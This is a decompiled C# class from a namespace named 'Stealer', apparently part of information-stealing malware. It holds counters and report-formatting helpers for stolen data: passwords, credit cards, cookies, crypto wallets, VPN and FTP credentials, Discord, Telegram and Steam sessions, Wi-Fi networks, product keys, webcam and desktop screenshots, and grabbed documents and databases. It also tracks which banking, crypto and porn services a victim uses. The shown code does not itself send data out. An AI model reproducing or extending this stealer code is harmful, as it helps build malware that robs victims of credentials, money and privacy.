using System;
using System.Collections.Generic;

namespace Stealer
{
	// Token: 0x0200000C RID: 12
	internal sealed class Counter
	{
		// Token: 0x06000041 RID: 65 RVA: 0x000029EB File Offset: 0x00000BEB
		public static string GetSValue(string application, bool value)
		{
			if (!value)
			{
				return "";
			}
			return "\n   ∟ " + application;
		}

		// Token: 0x06000042 RID: 66 RVA: 0x00002A01 File Offset: 0x00000C01
		public static string GetIValue(string application, int value)
		{
			if (value == 0)
			{
				return "";
			}
			return "\n   ∟ " + application + ": " + value.ToString();
		}

		// Token: 0x06000043 RID: 67 RVA: 0x00002A24 File Offset: 0x00000C24
		public static string GetLValue(string application, List<string> value, char separator = '∟')
		{
			value.Sort();
			if (value.Count == 0)
			{
				return "\n   ∟ " + application + " (No data)";
			}
			return string.Concat(new string[]
			{
				"\n   ∟ ",
				application,
				":\n\t\t\t\t\t\t\t",
				separator.ToString(),
				" ",
				string.Join("\n\t\t\t\t\t\t\t" + separator.ToString() + " ", value)
			});
		}

		// Token: 0x06000044 RID: 68 RVA: 0x00002AA0 File Offset: 0x00000CA0
		public static string GetBValue(bool value, string success, string failed)
		{
			if (!value)
			{
				return "\n   ∟ " + failed;
			}
			return "\n   ∟ " + success;
		}

		// Token: 0x04000025 RID: 37
		public static int Passwords = 0;

		// Token: 0x04000026 RID: 38
		public static int CreditCards = 0;

		// Token: 0x04000027 RID: 39
		public static int AutoFill = 0;

		// Token: 0x04000028 RID: 40
		public static int Cookies = 0;

		// Token: 0x04000029 RID: 41
		public static int History = 0;

		// Token: 0x0400002A RID: 42
		public static int Bookmarks = 0;

		// Token: 0x0400002B RID: 43
		public static int Downloads = 0;

		// Token: 0x0400002C RID: 44
		public static int VPN = 0;

		// Token: 0x0400002D RID: 45
		public static int Pidgin = 0;

		// Token: 0x0400002E RID: 46
		public static int Wallets = 0;

		// Token: 0x0400002F RID: 47
		public static int FTPHosts = 0;

		// Token: 0x04000030 RID: 48
		public static bool Telegram = false;

		// Token: 0x04000031 RID: 49
		public static bool Steam = false;

		// Token: 0x04000032 RID: 50
		public static bool Uplay = false;

		// Token: 0x04000033 RID: 51
		public static bool Discord = false;

		// Token: 0x04000034 RID: 52
		public static int SavedWifiNetworks = 0;

		// Token: 0x04000035 RID: 53
		public static bool ProductKey = false;

		// Token: 0x04000036 RID: 54
		public static bool DesktopScreenshot = false;

		// Token: 0x04000037 RID: 55
		public static bool WebcamScreenshot = false;

		// Token: 0x04000038 RID: 56
		public static int GrabberDocuments = 0;

		// Token: 0x04000039 RID: 57
		public static int GrabberSourceCodes = 0;

		// Token: 0x0400003A RID: 58
		public static int GrabberDatabases = 0;

		// Token: 0x0400003B RID: 59
		public static int GrabberImages = 0;

		// Token: 0x0400003C RID: 60
		public static bool BankingServices = false;

		// Token: 0x0400003D RID: 61
		public static bool CryptoServices = false;

		// Token: 0x0400003E RID: 62
		public static bool PornServices = false;

		// Token: 0x0400003F RID: 63
		public static List<string> DetectedBankingServices = new List<string>();

		// Token: 0x04000040 RID: 64
		public static List<string> DetectedCryptoServices = new List<string>();

		// Token: 0x04000041 RID: 65
		public static List<string> DetectedPornServices = new List<string>();
	}
}
